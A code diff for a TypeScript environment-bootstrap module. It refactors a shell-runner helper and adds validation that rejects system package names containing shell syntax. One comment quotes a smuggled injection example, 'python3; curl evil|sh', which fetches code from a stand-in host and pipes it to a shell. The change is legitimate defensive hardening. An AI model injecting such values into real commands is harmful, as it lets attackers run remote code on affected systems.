@@ -13,6 +13,7 @@ import { access, copyFile } from 'node:fs/promises';
 import { homedir } from 'node:os';
 import { join } from 'node:path';
 import { isAllowed, commandHead } from './gates.js';
+import { runShell as runShared } from './exec.js';
 import type { SecretRedactor } from './secrets.js';
 
 export interface ToolchainProbe {
@@ -151,36 +152,32 @@ export async function installTool(
 /** rootless 工具链的探测位置，会被加入 PATH。 */
 const EXTRA_BIN_DIRS = [BUN_HOME, NODE_HOME];
 
+/**
+ * 系统包名的允许字符集。包名会被拼进一条 shell 命令，所以除字面量外一律不接受：
+ * `;` `&` `|` `$` 反引号 括号 引号 空白 等全部落在字符类之外。
+ * 额外放行 `= : @ +` 是为了兼容 apt/dnf 的版本与架构后缀（如 `python3=3.11-1`）。
+ */
+const PACKAGE_NAME_RE = /^[A-Za-z0-9][A-Za-z0-9._+@=-]*$/;
+
+/**
+ * bootstrap 专用封装：保持原有四参数签名（六个调用点不动），只把 execFile 样板
+ * 交给共享 runner，留下本链路特有的两点差异 —— PATH 前置 rootless 安装目录，
+ * 以及就地脱敏日志尾（顺序仍是先截尾再脱敏，与合并前一致）。不设超时。
+ */
 async function runShell(
   command: string,
   cwd: string,
   redactor: SecretRedactor,
   signal?: AbortSignal,
 ): Promise<{ exitCode: number; logTail: string }> {
-  return new Promise((resolvePromise, reject) => {
-    const child = execFile(
-      '/bin/sh',
-      ['-c', command],
-      { cwd, maxBuffer: 16 * 1024 * 1024, env: { ...process.env, PATH: `${EXTRA_BIN_DIRS.join(':')}:${process.env.PATH ?? ''}` } },
-      (error, stdout, stderr) => {
-        cleanup();
-        const exitCode =
-          error === null ? 0 : typeof (error as { code?: unknown }).code === 'number' ? ((error as { code: number }).code) : 1;
-        resolvePromise({ exitCode, logTail: redactor.redact(`${stdout}${stderr}`.slice(-4000)) });
-      },
-    );
-    const onAbort = () => {
-      child.kill('SIGKILL');
-      cleanup();
-      reject(new Error(`bootstrap command aborted: ${command}`));
-    };
-    const cleanup = () => signal?.removeEventListener('abort', onAbort);
-    if (signal?.aborted === true) {
-      onAbort();
-      return;
-    }
-    signal?.addEventListener('abort', onAbort, { once: true });
+  const result = await runShared({
+    command,
+    cwd,
+    extraEnv: { PATH: `${EXTRA_BIN_DIRS.join(':')}:${process.env.PATH ?? ''}` },
+    label: 'bootstrap',
+    ...(signal !== undefined ? { signal } : {}),
   });
+  return { exitCode: result.exitCode, logTail: redactor.redact(result.logTail) };
 }
 
 export interface BootstrapOptions {
@@ -254,6 +251,17 @@ export async function bootstrapEnvironment(options: BootstrapOptions): Promise<B
     if (pm.trim() === '') {
       throw new BootstrapError(
         `systemPackages [${systemPackages.join(', ')}] requested but packageManagerCommand is empty; set it (e.g. "sudo apt-get install -y")`,
+        report,
+      );
+    }
+    // 包名会被裸拼进 pm 后面交给 shell，所以先要求它们是纯字面量：允许 apt/dnf
+    // 的版本与架构后缀（= : @ + . -），但任何 shell 语法一律拒绝。
+    // 少了这一步，`systemPackages: ['python3; curl evil|sh']` 就让下面的 pm
+    // 白名单校验形同虚设 —— 拼出来的 `rm` 没有任何一处检查见过。
+    const smuggled = systemPackages.filter((name) => !PACKAGE_NAME_RE.test(name));
+    if (smuggled.length > 0) {
+      throw new BootstrapError(
+        `systemPackages must be plain package names; rejected: ${smuggled.join(', ')}`,
         report,
       );
     }
